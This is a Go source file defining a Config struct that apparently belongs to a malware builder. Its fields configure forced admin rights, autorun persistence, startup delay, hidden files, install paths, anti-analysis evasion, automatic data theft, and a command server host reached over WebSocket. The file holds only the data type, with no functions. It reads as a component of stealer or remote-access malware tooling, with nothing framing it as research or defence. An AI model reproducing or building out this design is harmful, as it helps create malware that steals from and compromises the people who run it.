package buildergen

type Config struct {
	Name                string
	Password            string
	ForceAdmin          string
	IconBase64          string
	BuildID             string
	Comment             string
	AutorunMode         string
	StartupDelaySeconds int
	HideFilesEnabled    bool
	InstallMode         string
	CustomInstallPath   string
	AntiAnalysis        string
	AutoSteal           string

	Owner       string
	BuilderToken string
	ServerHost  string
	WSScheme    string
}
